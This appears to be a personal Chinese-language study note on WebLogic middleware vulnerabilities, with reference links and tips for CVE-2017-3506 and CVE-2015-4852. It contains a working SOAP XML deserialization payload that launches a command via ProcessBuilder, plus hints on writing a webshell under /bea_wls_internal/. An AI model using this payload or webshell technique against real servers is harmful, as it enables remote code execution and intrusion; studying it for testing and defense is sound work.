---
title: WebLogic
categories:
- Network_Security
- Web
- Middleware
- WebLogic
tags:
- Network_Security
date: 2024-01-29 11:27:46
---

# WebLogic 中间件漏洞

## 1. CVE-2017-3506 XMLDecoder 反序列化漏洞（版本：12.1.3.0）

### 1.1 参考文献

1. 主要可以参考下面两篇：

    > https://blog.csdn.net/he_and/article/details/90582262
    >
    > https://zhuanlan.zhihu.com/p/32301092
    >
    > https://www.freebuf.com/articles/web/272835.html

### 1.2 补充

1. 通过 POST 发包，虽然页面会报错，但是结果依旧可以正常执行：
    ![image-20230518143539966](image-20230518143539966.png)

2. 弹出计算机的 PoC：
    ```xml
    <soapenv:Envelope
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext
                xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java>
                    <object class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>cmd</string>
                            </void>
                            <void index="1">
                                <string>/c</string>
                            </void>
                            <void index="2">
                                <string>calc</string>
                            </void>
                        </array>
                        <void method="start"/>
                    </object>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
    ```

    注意缩进，可以使用 xml 格式工具进行格式规则化。

3. 写马的话，它需要文件路径：
    ![image-20230518145602040](image-20230518145602040.png)
    这个路径不知道怎么获得，如果能获得的话就能写入。写入之后通过访问：
    `/bea_wls_internal/马`即可。

4. 根据不同的版本，它的路径可能不同。如果是 10 版本，可能是 `/wls-wsat/`

## 2. CVE-2017-10271 和 CVE-2019-2725 todo

## 3. CVE-2015-4852 反序列化漏洞

### 3.1 参考

1. 链接如下：

    > https://bleke.top/posts/754158022/

2. 有关 T3 协议的：

    > https://www.cnblogs.com/nice0e3/p/14201884.html

### 3.2 补充

1. 本质上用的就是 CC1 链。应该是通过 t3 协议，将链发送到 7001 端口然后触发链。

